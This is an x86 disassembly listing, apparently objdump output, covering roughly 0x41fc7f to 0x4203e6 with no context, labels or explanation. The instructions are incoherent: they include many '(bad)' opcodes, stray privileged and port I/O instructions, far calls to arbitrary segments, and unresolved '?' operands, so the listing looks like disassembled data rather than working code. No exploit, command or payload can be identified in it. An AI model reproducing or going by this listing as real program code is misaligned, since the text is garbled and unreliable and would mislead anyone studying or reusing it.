  41fc7f:	loopne 0x41fcd1
  41fc81:	add    eax,0x634c9f5a
  41fc86:	repz or ecx,DWORD PTR [ebp+0x32]
  41fc8a:	dec    edi
  41fc8b:	out    0x6d,al
  41fc8d:	inc    eax
  41fc8e:	adc    bl,dh
  41fc90:	(bad)  
  41fc92:	sbb    eax,0xf64a2692
  41fc97:	fsub   QWORD PTR ss:[edx]
  41fc9a:	cs test esp,eax
  41fc9d:	inc    esp
  41fc9e:	mov    edi,0x5c6fa4a
  41fca3:	inc    eax
  41fca4:	mov    DWORD PTR [ebx+0x561aa77f],ebx
  41fcaa:	inc    ecx
  41fcab:	push   ebx
  41fcac:	sub    dh,BYTE PTR [ebp-0x18453de1]
  41fcb2:	sbb    dh,BYTE PTR [edi+edi*8]
  41fcb5:	xor    DWORD PTR [edx+0x5b50207],eax
  41fcbb:	sahf   
  41fcbc:	sub    BYTE PTR [ebx+0x2860d844],bh
  41fcc2:	adc    edx,edx
  41fcc4:	or     dh,dh
  41fcc6:	sub    BYTE PTR [ebp-0x41f1748b],ah
  41fccc:	repz mov edi,esp
  41fccf:	rcl    BYTE PTR [eax],cl
  41fcd1:	call   0x4451:0xc2504986
  41fcd8:	inc    esp
  41fcd9:	int3   
  41fcda:	xchg   ebx,eax
  41fcdb:	int    0x86
  41fcdd:	iret   
  41fcde:	(bad)  
  41fce0:	add    eax,0x5f63d747
  41fce5:	clc    
  41fce6:	pusha  
  41fce7:	and    DWORD PTR [edi+0x74],edi
  41fcea:	fscale 
  41fcec:	cwde   
  41fced:	cmp    eax,0xc21332fa
  41fcf2:	data16 aam 0xae
  41fcf5:	fwait
  41fcf6:	jecxz  0x41fd39
  41fcf8:	jbe    0x41fcdd
  41fcfa:	jae    0x41fcc2
  41fcfc:	bound  edi,QWORD PTR [edx-0x53]
  41fcff:	pushf  
  41fd00:	dec    edx
  41fd01:	outs   dx,BYTE PTR ds:[esi]
  41fd02:	jae    0x41fcce
  41fd04:	or     BYTE PTR [ebp+0x15],dl
  41fd07:	out    dx,eax
  41fd08:	loope  0x41fcc6
  41fd0a:	mov    WORD PTR [ecx],ss
  41fd0c:	pushf  
  41fd0d:	gs jl  0x41fd14
  41fd10:	rcr    esp,cl
  41fd12:	cdq    
  41fd13:	pop    ecx
  41fd14:	and    al,0xc4
  41fd16:	enter  0x7675,0x43
  41fd1a:	popa   
  41fd1b:	sbb    dl,BYTE PTR [edi]
  41fd1d:	sbb    eax,0x27f929ca
  41fd22:	mov    ds:0x596f56c1,eax
  41fd27:	cld    
  41fd28:	rcl    BYTE PTR gs:[eax+0x5a],0x2a
  41fd2d:	in     eax,0xbf
  41fd2f:	idiv   DWORD PTR [edi+0x22]
  41fd32:	cmc    
  41fd33:	fld    DWORD PTR [eax+0x4a3da0fc]
  41fd39:	jl     0x41fd98
  41fd3b:	in     eax,dx
  41fd3c:	mov    edx,0xd361d30d
  41fd41:	hlt    
  41fd42:	sub    al,0xdd
  41fd45:	shl    DWORD PTR [esi+0x1a02b1e8],1
  41fd4b:	jge    0x41fd30
  41fd4d:	dec    ecx
  41fd4e:	pop    ecx
  41fd4f:	bound  edx,QWORD PTR [edx]
  41fd51:	jbe    0x41fcee
  41fd53:	push   0x2d0c1278
  41fd58:	sti    
  41fd59:	inc    edi
  41fd5a:	mul    ch
  41fd5c:	sub    al,BYTE PTR [ecx]
  41fd5e:	inc    ecx
  41fd60:	sub    BYTE PTR [esi-0x79e9b9bf],dl
  41fd66:	sub    al,bh
  41fd68:	sub    eax,0xa8bccba0
  41fd6d:	jl     0x41fd4d
  41fd6f:	cmp    ah,BYTE PTR [ecx+0xf]
  41fd72:	clc    
  41fd73:	cmp    dh,ah
  41fd75:	sbb    DWORD PTR [eax],ebx
  41fd77:	int3   
  41fd78:	pop    ecx
  41fd79:	js     0x41fdcf
  41fd7b:	mov    BYTE PTR [esi-0x5b],bl
  41fd7e:	ds test al,0x38
  41fd81:	adc    al,0xa9
  41fd83:	inc    ebx
  41fd84:	lods   al,BYTE PTR ds:[esi]
  41fd85:	lods   al,BYTE PTR ds:[esi]
  41fd86:	sar    BYTE PTR ds:0xe728d57e,1
  41fd8c:	arpl   WORD PTR [edx+0x20],cx
  41fd8f:	sbb    al,0x18
  41fd91:	mov    edx,0x5485af4e
  41fd96:	push   ebx
  41fd97:	or     BYTE PTR [ecx+0x6c1a7bda],dl
  41fd9d:	jno    0x41fe1d
  41fd9f:	repz lea esp,[eax+0x12577bb]
  41fda6:	jmp    0x11245755
  41fdab:	pop    fs
  41fdad:	xchg   esp,eax
  41fdae:	jae    0x41fde7
  41fdb0:	xlat   BYTE PTR ds:[ebx]
  41fdb1:	add    esi,DWORD PTR [ebp-0x7c75ae97]
  41fdb7:	mov    ecx,0x99dc3a71
  41fdbc:	in     al,dx
  41fdbd:	and    eax,0x2b423c8b
  41fdc2:	cmp    dl,BYTE PTR [esi+0x444e98e7]
  41fdc8:	mov    ch,0xf7
  41fdca:	lods   al,BYTE PTR ds:[esi]
  41fdcb:	ror    DWORD PTR [ebp-0x7e],1
  41fdce:	loope  0x41fdd7
  41fdd0:	pop    eax
  41fdd1:	loopne 0x41fdab
  41fdd3:	push   eax
  41fdd4:	xlat   BYTE PTR ds:[ebx]
  41fdd5:	ficomp WORD PTR [ecx+0xc78d39e]
  41fddb:	jns    0x41fdb8
  41fddd:	out    0xe0,al
  41fddf:	pop    edx
  41fde0:	shl    DWORD PTR [ebx+0x4],1
  41fde3:	mov    ebp,ss
  41fde5:	xchg   edx,eax
  41fde6:	aaa    
  41fde7:	or     DWORD PTR [ebx],eax
  41fde9:	push   eax
  41fdea:	mov    dh,0xfb
  41fdec:	pop    ss
  41fded:	or     al,0xab
  41fdef:	jbe    0x41fe54
  41fdf1:	scas   al,BYTE PTR es:[edi]
  41fdf2:	sahf   
  41fdf3:	das    
  41fdf4:	and    al,0xf0
  41fdf6:	sub    al,0x69
  41fdf8:	jae    0x41fda3
  41fdfa:	push   ds
  41fdfb:	not    DWORD PTR [ebx+0x70]
  41fdfe:	js     0x41fdcb
  41fe00:	push   edx
  41fe01:	retf   0x82f7
  41fe04:	into   
  41fe05:	xor    DWORD PTR [edx-0x46c85375],ebx
  41fe0b:	hlt    
  41fe0c:	sti    
  41fe0d:	inc    ebp
  41fe0e:	or     eax,0x4709fcd6
  41fe13:	adc    BYTE PTR [edi-0x79642972],bh
  41fe19:	sub    BYTE PTR [esi+0x6d],bl
  41fe1c:	les    esi,FWORD PTR [edx-0x35]
  41fe1f:	xchg   esp,eax
  41fe20:	es push eax
  41fe22:	xor    ebp,DWORD PTR [edi]
  41fe24:	xor    ch,BYTE PTR [esi]
  41fe26:	dec    ebp
  41fe27:	inc    esi
  41fe28:	jae    0x41fe1a
  41fe2a:	pop    esi
  41fe2b:	adc    BYTE PTR [edx+0x6a],bh
  41fe2e:	xchg   esp,eax
  41fe2f:	aad    0x42
  41fe31:	sbb    al,0xfb
  41fe33:	xor    eax,0xa170cc36
  41fe38:	das    
  41fe39:	das    
  41fe3a:	xchg   ebx,eax
  41fe3b:	jl     0x41fdf7
  41fe3d:	loope  0x41fddb
  41fe3f:	fidivr DWORD PTR [esi]
  41fe41:	rcl    bl,1
  41fe43:	push   ss
  41fe44:	inc    esi
  41fe45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe46:	ret    
  41fe47:	ror    ch,0x98
  41fe4a:	fsub   st(4),st
  41fe4c:	add    BYTE PTR [ecx],cl
  41fe4e:	push   DWORD PTR [ebx+0x25b2aa9e]
  41fe54:	sub    BYTE PTR [ecx-0x47cbebe5],dl
  41fe5a:	and    edx,DWORD PTR [ebp+0x6a9d50fc]
  41fe60:	mov    ebp,0xf1be62a6
  41fe65:	push   0x6ba7c7f5
  41fe6a:	mov    dl,0x5c
  41fe6c:	or     DWORD PTR [edx+esi*8],edi
  41fe6f:	jne    0x41fe67
  41fe71:	test   ecx,eax
  41fe73:	sahf   
  41fe74:	mov    eax,ds:0xf0835bca
  41fe79:	sbb    DWORD PTR [esi-0x6f789fd2],0x4e173e01
  41fe83:	mov    ds:0xdcd9531a,al
  41fe88:	xor    cl,BYTE PTR [edx+0x68]
  41fe8b:	xchg   esi,eax
  41fe8c:	lds    edi,FWORD PTR [ebp-0x1a]
  41fe8f:	cmp    ah,BYTE PTR [esp+esi*1-0x4f]
  41fe93:	push   edx
  41fe94:	pop    es
  41fe95:	aaa    
  41fe96:	add    bh,BYTE PTR [eax-0x15d2a30e]
  41fe9c:	fcmovbe st,st(1)
  41fe9e:	jb     0x41fe3d
  41fea0:	sub    ebp,esi
  41fea2:	xor    al,0x3b
  41fea4:	jb     0x41fea2
  41fea6:	int3   
  41fea7:	inc    esi
  41fea8:	mov    ?,esp
  41feaa:	mov    al,ds:0x23a16abb
  41feaf:	into   
  41feb0:	cmp    ah,BYTE PTR [ecx-0x7d]
  41feb3:	fstp   QWORD PTR [esi]
  41feb5:	jp     0x41fe4b
  41feb7:	sub    al,BYTE PTR [ecx-0x7752d6b9]
  41febd:	in     eax,dx
  41febe:	loopne 0x41fe4e
  41fec0:	dec    edi
  41fec1:	mov    ah,0x4
  41fec3:	inc    ecx
  41fec4:	fld    QWORD PTR [esi]
  41fec6:	and    BYTE PTR [esi],0x9b
  41fec9:	leave  
  41feca:	leave  
  41fecb:	cmp    eax,0xf7a07991
  41fed0:	outs   dx,BYTE PTR ds:[esi]
  41fed1:	sub    edi,edi
  41fed3:	jae    0x41ff3b
  41fed5:	daa    
  41fed6:	out    dx,eax
  41fed7:	(bad)  
  41fed8:	fwait
  41fed9:	or     ch,al
  41fedb:	cmp    eax,DWORD PTR [ebp+0x206a04e]
  41fee1:	push   cs
  41fee2:	ins    BYTE PTR es:[edi],dx
  41fee3:	pop    gs
  41fee5:	dec    esi
  41fee6:	pop    ds
  41fee7:	push   0x47
  41fee9:	shl    ebp,0x8c
  41feec:	jp     0x41fecc
  41feee:	leave  
  41feef:	(bad)  
  41fef0:	out    0x69,al
  41fef2:	mov    bl,0x7e
  41fef4:	sub    ecx,eax
  41fef6:	mov    bl,0x95
  41fef8:	mov    WORD PTR [esi-0x4cde3528],gs
  41fefe:	xchg   edx,eax
  41feff:	mov    dh,0x5d
  41ff01:	clc    
  41ff02:	mov    bh,0x3c
  41ff04:	xlat   BYTE PTR fs:[ebx]
  41ff06:	pop    esp
  41ff07:	sahf   
  41ff08:	lock sahf 
  41ff0a:	or     DWORD PTR [ebp-0x45],0x344d25eb
  41ff11:	cmp    ecx,0xe11dbdc7
  41ff17:	adc    cl,BYTE PTR [esi+0x1af063f9]
  41ff1d:	pusha  
  41ff1e:	adc    eax,0x7ec83c9c
  41ff23:	fld    TBYTE PTR [esi]
  41ff25:	int3   
  41ff26:	pop    es
  41ff27:	outs   dx,DWORD PTR ds:[esi]
  41ff28:	repnz int 0x99
  41ff2b:	push   es
  41ff2c:	cmp    eax,0xb9618c5b
  41ff31:	leave  
  41ff32:	in     eax,0xbc
  41ff34:	and    al,0xe0
  41ff36:	pop    ebx
  41ff37:	rcl    BYTE PTR [ebp-0x47d7f21d],1
  41ff3d:	cmp    ebp,ebp
  41ff3f:	sbb    BYTE PTR [edi-0x6],0xdf
  41ff43:	inc    edx
  41ff44:	adc    DWORD PTR [edi-0x36fbfc00],ebx
  41ff4a:	test   BYTE PTR [edi-0x1c],0xf6
  41ff4e:	push   ebp
  41ff4f:	or     edx,DWORD PTR [ebp+eiz*1+0x28773cc9]
  41ff56:	xchg   esp,eax
  41ff57:	xlat   BYTE PTR ds:[ebx]
  41ff58:	cld    
  41ff59:	jne    0x41ff5d
  41ff5b:	sub    ch,bl
  41ff5d:	pop    edx
  41ff5e:	aas    
  41ff5f:	ds dec ecx
  41ff61:	cmp    BYTE PTR [esi],cl
  41ff63:	push   0x546e8526
  41ff68:	sbb    bl,ch
  41ff6a:	scas   eax,DWORD PTR es:[edi]
  41ff6b:	xchg   ebx,eax
  41ff6c:	and    BYTE PTR [ebp+0x5f],al
  41ff6f:	sub    eax,DWORD PTR [ecx]
  41ff71:	pop    ss
  41ff72:	ja     0x41ff49
  41ff74:	neg    BYTE PTR [edx]
  41ff76:	or     DWORD PTR [ebx-0x2434a4d],ebp
  41ff7c:	gs ret 0x1342
  41ff80:	loope  0x41ff3a
  41ff82:	sbb    ecx,DWORD PTR [edi]
  41ff84:	(bad)  
  41ff85:	int    0x1d
  41ff87:	sub    DWORD PTR [eax],edi
  41ff89:	cmp    ah,0x4c
  41ff8c:	test   al,0x7c
  41ff8e:	out    dx,eax
  41ff8f:	sub    eax,0x8567371f
  41ff94:	mov    cl,0x5f
  41ff96:	test   al,0xc
  41ff98:	jecxz  0x41ffd2
  41ff9a:	push   ebp
  41ff9b:	and    ch,BYTE PTR [edi-0xa]
  41ff9e:	adc    al,BYTE PTR [ebx]
  41ffa0:	push   es
  41ffa1:	(bad)  
  41ffa2:	js     0x41ff72
  41ffa4:	scas   al,BYTE PTR es:[edi]
  41ffa5:	dec    ecx
  41ffa6:	popf   
  41ffa7:	icebp  
  41ffa8:	lock sbb bl,BYTE PTR [ebx-0x181c9def]
  41ffaf:	rcl    BYTE PTR [ebp+0x3b],cl
  41ffb2:	mov    cl,0x7b
  41ffb4:	repz (bad) 
  41ffb6:	sub    BYTE PTR [ebx-0x44],ah
  41ffb9:	call   0x7c5c:0xadf2bb3f
  41ffc0:	pop    ds
  41ffc1:	sub    ch,ah
  41ffc3:	jno    0x420039
  41ffc5:	adc    DWORD PTR [ebx+ecx*8-0x181e089],edi
  41ffcc:	jmp    0xa303:0x4c24ddab
  41ffd3:	xlat   BYTE PTR ds:[ebx]
  41ffd4:	clc    
  41ffd5:	xor    bl,al
  41ffd7:	outs   dx,BYTE PTR ds:[esi]
  41ffd8:	or     eax,0x7b15ba2c
  41ffdd:	es cmp al,0x23
  41ffe0:	fnstenv [edi+0x4afee5b5]
  41ffe6:	inc    ecx
  41ffe7:	int    0xc6
  41ffe9:	mov    al,0x85
  41ffeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ffec:	fisubr WORD PTR [edi+edx*2]
  41ffef:	mov    fs,esi
  41fff1:	adc    ch,BYTE PTR [ebp+0x6f]
  41fff4:	and    BYTE PTR [esi],dh
  41fff6:	jnp    0x420017
  41fff8:	cwde   
  41fff9:	pop    ecx
  41fffa:	rol    esi,0xa2
  41fffd:	mov    ds:0x787dad9e,al
  420002:	jl     0x420031
  420004:	(bad)  
  420006:	adc    esp,ecx
  420008:	ret    0xaa8d
  42000b:	push   ss
  42000c:	cwde   
  42000d:	call   0xff6b:0xef1de642
  420014:	jne    0x41ffd4
  420016:	sub    al,0xf4
  420018:	call   0x6951:0x78d23350
  42001f:	aam    0x0
  420021:	test   BYTE PTR [edi],dh
  420023:	dec    BYTE PTR [edi+0x2d]
  420026:	pop    ss
  420027:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420028:	je     0x4200a3
  42002a:	push   ds
  42002b:	call   0x3ea4:0xc678aa56
  420032:	sbb    DWORD PTR ds:0x5745dbd3,0x47861cf1
  42003c:	pop    esp
  42003d:	aam    0xf2
  42003f:	imul   esi,DWORD PTR ds:0x7c41f636,0x20c1f4d
  420049:	add    BYTE PTR [edx-0x4d29763f],dh
  42004f:	ds arpl dx,dx
  420052:	loopne 0x42004a
  420054:	iret   
  420055:	cmp    DWORD PTR gs:[eax],ecx
  420058:	mov    cl,BYTE PTR [ebx-0x7a69937b]
  42005e:	xlat   BYTE PTR ds:[ebx]
  42005f:	dec    eax
  420060:	inc    edi
  420061:	or     bh,BYTE PTR [ebx-0x9f1c967]
  420067:	popa   
  420068:	cmp    eax,0xe8a1dbf5
  42006d:	shl    DWORD PTR [ebp-0x48],1
  420070:	xchg   esi,eax
  420071:	sbb    eax,0xf40bfc90
  420076:	hlt    
  420077:	xchg   edi,eax
  420078:	adc    al,0x7c
  42007a:	pushf  
  42007b:	mov    DWORD PTR [ebp+0x27],eax
  42007e:	push   esi
  42007f:	in     al,dx
  420080:	dec    esi
  420081:	icebp  
  420082:	fwait
  420083:	stos   BYTE PTR es:[edi],al
  420084:	(bad)  [esi+0x4f672c4a]
  42008a:	fild   WORD PTR [edx+edx*8]
  42008d:	mov    ecx,0xf771b8d4
  420092:	add    ebp,DWORD PTR [edi]
  420094:	scas   al,BYTE PTR es:[edi]
  420095:	jmp    0xa77dfa40
  42009a:	(bad)  
  42009c:	out    dx,eax
  42009d:	mov    ch,0x9d
  42009f:	inc    ebp
  4200a0:	xchg   esp,eax
  4200a1:	push   eax
  4200a2:	ret    
  4200a3:	ja     0x420108
  4200a5:	(bad)  
  4200a7:	(bad)  
  4200a9:	pop    edi
  4200aa:	mov    ds:0x4c4264fc,eax
  4200af:	add    DWORD PTR ds:[ecx+0x3d0d892],eax
  4200b6:	push   edi
  4200b7:	jno    0x420039
  4200b9:	mov    bl,0xa0
  4200bb:	mov    ch,BYTE PTR [edx]
  4200bd:	dec    ebx
  4200be:	pop    esi
  4200bf:	mov    ecx,0xf87c4bdf
  4200c4:	shr    BYTE PTR [eax-0x19974f5b],cl
  4200ca:	sbb    al,0x23
  4200cc:	in     eax,dx
  4200cd:	sub    DWORD PTR [edx],0x7f
  4200d0:	or     DWORD PTR [eax],edx
  4200d2:	push   esi
  4200d3:	inc    esp
  4200d4:	test   DWORD PTR [edx+0x4d],esp
  4200d7:	pop    ebp
  4200d8:	push   0x1b
  4200da:	outs   dx,BYTE PTR ds:[esi]
  4200db:	sbb    DWORD PTR [edi-0xf],ecx
  4200de:	icebp  
  4200df:	popa   
  4200e0:	and    dl,BYTE PTR [ecx+ebp*1]
  4200e3:	cmp    al,0x13
  4200e5:	(bad)  
  4200e6:	xor    al,0x3
  4200e8:	mov    ebx,DWORD PTR [edx]
  4200ea:	push   ebx
  4200eb:	dec    ebp
  4200ec:	ficom  DWORD PTR [esi]
  4200ee:	fisubr DWORD PTR [ebp+0x2e]
  4200f1:	mov    ecx,0xeacbd5d4
  4200f6:	push   esp
  4200f7:	(bad)  
  4200f8:	mov    al,0x6
  4200fa:	jmp    0x4200ab
  4200fc:	add    DWORD PTR [ebp+0x3b565d88],eax
  420102:	arpl   WORD PTR [ebp-0x18ce81ca],si
  420108:	cmp    DWORD PTR [eax-0x2a],0x49
  42010c:	out    dx,al
  42010d:	sub    BYTE PTR [ebx+ebx*2+0x373faed8],al
  420114:	push   0x51
  420116:	inc    BYTE PTR [ebx-0x29b2c37e]
  42011c:	(bad)  
  42011d:	push   esp
  42011e:	sbb    al,0x85
  420120:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420121:	call   0x2512:0xb226a4dd
  420128:	add    al,0x44
  42012a:	rcl    DWORD PTR [ebp+0x43c21819],1
  420130:	mov    edi,0x501d93c7
  420135:	xchg   esp,eax
  420136:	jl     0x4201b6
  420138:	jnp    0x4201a6
  42013a:	stos   BYTE PTR es:[edi],al
  42013b:	mov    DWORD PTR [edi],edi
  42013d:	sbb    al,0x38
  42013f:	push   ebp
  420140:	jnp    0x420189
  420142:	push   0xa0ab2387
  420147:	or     ch,bl
  420149:	mov    ah,cl
  42014b:	aam    0x2e
  42014d:	stc    
  42014e:	sub    DWORD PTR [eax],esi
  420150:	inc    eax
  420151:	pusha  
  420152:	in     al,dx
  420153:	and    BYTE PTR [eax],dl
  420155:	cmovb  eax,DWORD PTR [edx]
  420158:	or     edx,DWORD PTR [ebx-0x5e]
  42015b:	out    0x7f,eax
  42015d:	dec    ebp
  42015e:	xor    al,0x32
  420160:	pop    ebx
  420161:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420162:	cs jge 0x4201d4
  420165:	les    esi,FWORD PTR [edx+edi*1+0x3c6685cc]
  42016c:	shl    BYTE PTR [esp+ecx*2+0xc],1
  420170:	je     0x42019f
  420172:	retf   
  420173:	sub    BYTE PTR [edx+0x2c0cdff0],bh
  420179:	jle    0x4201cc
  42017b:	loop   0x420160
  42017d:	sahf   
  42017e:	dec    esi
  42017f:	repnz mov eax,ds:0x292c1faa
  420185:	sbb    al,0x84
  420187:	retf   
  420188:	xor    BYTE PTR [ebx],dh
  42018a:	cmp    ebx,ecx
  42018c:	push   esp
  42018d:	ret    
  42018e:	mov    al,0x36
  420190:	cs inc edx
  420192:	mov    ecx,0xee15c28c
  420197:	sbb    edi,ebp
  420199:	mov    ds:0x988efbe4,eax
  42019e:	pop    ecx
  42019f:	adc    DWORD PTR ds:0x4031a943,edi
  4201a5:	shr    DWORD PTR [eax],1
  4201a7:	xchg   ebx,eax
  4201a8:	les    esp,FWORD PTR [ebx-0x4396f4c1]
  4201ae:	into   
  4201af:	lods   eax,DWORD PTR ds:[esi]
  4201b0:	cdq    
  4201b1:	xor    BYTE PTR [edx-0x232570d6],ah
  4201b7:	xchg   eax,eax
  4201b9:	ins    BYTE PTR es:[edi],dx
  4201ba:	jp     0x4201bd
  4201bc:	(bad)  
  4201bd:	mov    cs,WORD PTR [edx-0x5c]
  4201c0:	ins    DWORD PTR es:[edi],dx
  4201c1:	lods   al,BYTE PTR ds:[esi]
  4201c2:	lahf   
  4201c3:	sbb    al,0xec
  4201c5:	outs   dx,DWORD PTR ds:[esi]
  4201c6:	loop   0x42020d
  4201c8:	enter  0xa226,0x29
  4201cc:	cld    
  4201cd:	lds    ecx,FWORD PTR [edx+0x508cbeba]
  4201d3:	in     al,dx
  4201d4:	mov    ebx,0xe7be4622
  4201d9:	mov    ds:0x1b385fed,al
  4201de:	pop    edx
  4201df:	das    
  4201e0:	cld    
  4201e1:	call   0x93ccdbeb
  4201e6:	inc    eax
  4201e7:	sub    al,0x32
  4201e9:	sbb    DWORD PTR ds:0xe0f8c1bf,eax
  4201ef:	pop    ds
  4201f0:	paddsw mm6,QWORD PTR [ebx]
  4201f3:	xchg   edx,eax
  4201f4:	pop    ebp
  4201f5:	mov    al,0xb9
  4201f7:	push   0x23
  4201f9:	js     0x42019e
  4201fb:	sbb    ebp,DWORD PTR [ecx]
  4201fd:	je     0x4201ab
  4201ff:	adc    al,0x9
  420201:	xchg   ebp,eax
  420202:	mov    ecx,0x9347495d
  420207:	push   esi
  420208:	adc    ebp,DWORD PTR [esi+edx*8-0x28]
  42020c:	daa    
  42020d:	cmc    
  42020e:	outs   dx,DWORD PTR ds:[esi]
  42020f:	int3   
  420210:	out    0x18,al
  420212:	or     al,0x67
  420214:	mov    ch,0xdd
  420216:	repnz aam 0xc3
  420219:	push   ss
  42021a:	(bad)  
  42021b:	shl    edx,1
  42021d:	and    edi,ecx
  42021f:	xlat   BYTE PTR ds:[ebx]
  420220:	mov    edx,0xefce41cf
  420225:	mov    ebx,0x5df6ca25
  42022a:	aas    
  42022b:	or     ch,dh
  42022d:	mov    cl,0xa8
  42022f:	aaa    
  420230:	dec    esi
  420231:	popa   
  420232:	mov    al,ds:0x104627f9
  420237:	mov    ebp,0xee0cb3b3
  42023c:	test   BYTE PTR [esi],dl
  42023e:	hlt    
  42023f:	fstp   QWORD PTR [edi-0xa]
  420242:	and    eax,0x6f44888b
  420247:	or     edx,DWORD PTR [eax-0x2888f66d]
  42024d:	adc    DWORD PTR [edx],eax
  42024f:	or     esi,esi
  420251:	loop   0x4201fa
  420253:	stc    
  420254:	add    BYTE PTR ss:[ebx-0x7d],0x25
  420259:	into   
  42025a:	out    dx,al
  42025b:	jmp    0x420299
  42025d:	cdq    
  42025e:	aad    0xff
  420260:	fidiv  DWORD PTR [esi+0x9]
  420263:	inc    BYTE PTR [edx]
  420265:	mov    bl,0x87
  420267:	dec    ebp
  420268:	enter  0x3221,0x44
  42026c:	mov    WORD PTR [edx+0x6c],?
  42026f:	xchg   esi,eax
  420270:	nop
  420271:	(bad)  
  420272:	inc    esi
  420273:	fistp  DWORD PTR gs:[ebp-0x7476ba4a]
  42027a:	pop    es
  42027b:	lds    ecx,FWORD PTR [ebx-0x40]
  42027e:	jg     0x42023f
  420280:	ja     0x420276
  420282:	retf   
  420283:	jmp    0x4202fd
  420285:	rcr    BYTE PTR [edi+0x2ae11e19],1
  42028b:	ret    
  42028c:	sbb    ebx,0x6658844b
  420292:	jle    0x4202a3
  420294:	and    dl,BYTE PTR [ecx+0x69d2e90b]
  42029a:	lahf   
  42029b:	dec    esp
  42029c:	dec    ebx
  42029d:	and    al,0x46
  42029f:	aam    0x4b
  4202a1:	push   eax
  4202a2:	jmp    0x7a1c:0x63a4598b
  4202a9:	dec    edx
  4202aa:	and    bh,BYTE PTR [ecx]
  4202ac:	push   ss
  4202ad:	sbb    BYTE PTR [edx+0xb],ah
  4202b0:	xlat   BYTE PTR ds:[ebx]
  4202b1:	aad    0x3
  4202b3:	pop    ss
  4202b4:	fcomp  st(0)
  4202b6:	sbb    al,0x7c
  4202b8:	imul   esi,DWORD PTR [edi],0xada9e20e
  4202be:	dec    BYTE PTR [eax+0x5d]
  4202c1:	add    edx,0x68c5afde
  4202c7:	xchg   DWORD PTR [edi-0x65],edi
  4202ca:	mov    ebp,0xec135506
  4202cf:	adc    eax,0xbaf593d3
  4202d4:	sub    eax,0x35e95902
  4202d9:	cs stos DWORD PTR es:[edi],eax
  4202db:	outs   dx,DWORD PTR ds:[esi]
  4202dc:	lea    edx,[eax+0x46a8bad2]
  4202e2:	pop    eax
  4202e3:	pop    ebx
  4202e4:	dec    edx
  4202e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4202e6:	shr    DWORD PTR [ecx],cl
  4202e8:	nop
  4202e9:	cmp    esp,DWORD PTR [edx]
  4202eb:	adc    ch,BYTE PTR [esi+ebx*1+0x7a]
  4202ef:	pop    ecx
  4202f0:	adc    ah,ch
  4202f2:	enter  0x85cc,0x88
  4202f6:	cdq    
  4202f7:	sbb    DWORD PTR [eax-0x5c],edx
  4202fa:	int3   
  4202fb:	sbb    eax,0x60fc53f2
  420300:	jo     0x420295
  420302:	dec    edi
  420303:	pushf  
  420304:	inc    eax
  420305:	retf   
  420306:	add    DWORD PTR [ebp+0x4b],eax
  420309:	cdq    
  42030a:	addr16 mov bh,0x43
  42030d:	xor    eax,0x19232fde
  420312:	add    al,0x27
  420314:	out    0xbb,eax
  420316:	push   edi
  420317:	mov    eax,ds:0x4278f7d7
  42031c:	ret    0x29d7
  42031f:	cmc    
  420320:	imul   ecx,edx,0x5e
  420323:	pop    ecx
  420324:	icebp  
  420325:	enter  0xc463,0xac
  420329:	add    BYTE PTR [edi+ecx*4],ch
  42032c:	ret    0xbb04
  42032f:	(bad)  
  420330:	fldcw  WORD PTR [eax+0x7a]
  420333:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420334:	or     eax,0x75b7c55a
  420339:	imul   edi,DWORD PTR [ebx+0x47],0x575751ad
  420340:	mov    eax,ds:0xebe35ba7
  420345:	xor    al,0x49
  420347:	je     0x4203a1
  420349:	in     eax,dx
  42034a:	retf   0xcf6d
  42034d:	mov    dl,0x9e
  42034f:	mov    ch,0x5e
  420351:	cli    
  420352:	jmp    0x42036c
  420354:	lods   al,BYTE PTR ds:[esi]
  420355:	push   eax
  420356:	loop   0x4203c4
  420358:	sar    BYTE PTR [ebx-0x6a],0x94
  42035c:	loopne 0x4202e7
  42035e:	clc    
  42035f:	inc    eax
  420360:	call   0xaa018397
  420365:	std    
  420366:	loop   0x4203e3
  420368:	inc    edx
  420369:	stos   DWORD PTR es:[edi],eax
  42036a:	stc    
  42036b:	and    DWORD PTR [edx+0x46ba2659],edx
  420371:	mov    ch,0xb2
  420373:	mov    dh,0x77
  420375:	sub    bh,dl
  420377:	clc    
  420378:	mov    bl,0x8
  42037a:	bound  ecx,QWORD PTR [ecx+esi*4-0x66]
  42037e:	pushf  
  42037f:	push   es
  420380:	ds ins DWORD PTR es:[edi],dx
  420382:	push   ebp
  420383:	mov    DWORD PTR [edi],ebx
  420385:	stc    
  420386:	mov    ecx,0x50634d49
  42038b:	adc    ch,bl
  42038d:	sub    eax,0xb48693ca
  420392:	mov    ah,0xe3
  420394:	imul   ecx,DWORD PTR [ebx+ebp*1],0x58
  420398:	pop    es
  420399:	inc    esp
  42039a:	ret    0xbf2e
  42039d:	ins    DWORD PTR es:[edi],dx
  42039e:	cwde   
  42039f:	rcr    DWORD PTR [esi],cl
  4203a1:	js     0x42037a
  4203a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4203a4:	jp     0x420370
  4203a6:	out    dx,al
  4203a7:	ins    DWORD PTR es:[edi],dx
  4203a8:	mov    ebx,0x80e7061b
  4203ad:	ss out dx,eax
  4203af:	or     edi,DWORD PTR [edx+0x2a]
  4203b2:	xchg   edx,eax
  4203b3:	shl    BYTE PTR [ebx+0x449d1500],cl
  4203b9:	daa    
  4203ba:	add    ebx,ebp
  4203bc:	xchg   edi,eax
  4203bd:	dec    eax
  4203be:	(bad)  
  4203bf:	stos   DWORD PTR es:[edi],eax
  4203c0:	inc    edx
  4203c1:	jne    0x420434
  4203c3:	adc    esi,DWORD PTR [ebp-0x5a1f9bb8]
  4203c9:	jno    0x42035a
  4203cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4203cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4203cd:	scas   al,BYTE PTR es:[edi]
  4203ce:	adc    BYTE PTR [ecx-0x77df1bd5],0x3d
  4203d5:	push   ebp
  4203d6:	loope  0x42038f
  4203d8:	lods   al,BYTE PTR ds:[esi]
  4203d9:	loopne 0x420440
  4203db:	(bad)  
  4203dc:	js     0x4203ac
  4203de:	pop    ebp
  4203df:	ret    
  4203e0:	dec    ebx
  4203e1:	mov    ah,0x39
  4203e3:	jle    0x4203a4
  4203e5:	pop    ss
  4203e6:	jb     0x420368
